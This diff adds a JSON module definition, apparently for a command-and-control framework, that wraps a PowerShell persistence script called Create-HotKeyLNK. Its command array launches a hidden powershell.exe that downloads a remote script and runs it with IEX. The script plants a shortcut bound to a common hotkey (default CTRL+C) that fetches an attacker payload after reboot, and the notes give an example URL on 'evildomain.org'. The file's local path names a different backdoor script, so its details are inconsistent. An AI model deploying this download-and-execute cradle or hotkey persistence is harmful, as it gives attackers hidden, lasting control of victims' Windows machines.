@@ -1,0 +1,45 @@
+{
+  "base": {
+    "name": "Create-HotKeyLNK",
+    "type": "standard",
+    "author": ["Russel Van Tuyl (@Ne0nd0g)"],
+    "credits": ["Steve Borosh (@rvrsh3ll)"],
+    "path": ["windows", "x64", "powershell", "persistence", "Create-HotKeyLNK.json"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "powershell",
+    "privilege": false,
+    "remote": "https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Create-HotKeyLNK.ps1",
+    "local": ["data", "src", "rvrsh3ll", "Misc-Powershell-Scripts", "Invoke-ADSBackdoor.ps1"],
+    "options": [
+      {"name": "Name", "value": null, "required": true, "flag": "-Name", "description":"The name of the .LNK file to create."},
+      {"name": "PersistencePath", "value": null, "required": true, "flag": "-PersistencePath", "description":"The path to drop the new LNK file. TaskBar,ImplicitAppShortcuts,Start Menu, or Desktop. Defaults to TaskBar."},
+      {"name": "EXEPath", "value": null, "required": false, "flag": "-EXEPath", "description":" Path to the exe you want to execute. Defaults to Internet Explorer."},
+      {"name": "IconPath", "value": null, "required": false, "flag": "-IconPath", "description":"Path to an exe for an icon. Defaults to Internet Explorer."},
+      {"name": "HotKey", "value": null, "required": false, "flag": "-HotKey", "description":"HotKey to bind to. Defaults to \"CTRL+C\"."},
+      {"name": "PayloadURI", "value": "", "required": true, "flag": "-PayloadURI", "description":""}
+    ],
+    "description": "Create an LNK file that bind's to a hotkey after reboot.",
+    "notes": "Example: Create-HotKeyLNK -Name Google -PersistencePath ImplicitAppShortcuts -HotKey \"CTRL+C\" -PayloadURI \"http://evildomain.org/toteslegit.ps1\"\r\nModified from @enigma0x3 https://gist.github.com/enigma0x3/167a213eee2e245986a5ca90bab76c6a",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w",
+      "0",
+      "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Create-HotKeyLNK.ps1');",
+      "Create-HotKeyLNK",
+      "{{Name}}",
+      "{{PersistencePath}}",
+      "{{EXEPath}}",
+      "{{IconPath}}",
+      "{{HotKey}}",
+      "{{PayloadURI}}",
+      "\""
+    ]
+  },
+  "powershell": {
+    "disableav": false,
+    "obfuscate": false,
+    "base64": false
+  }
+}
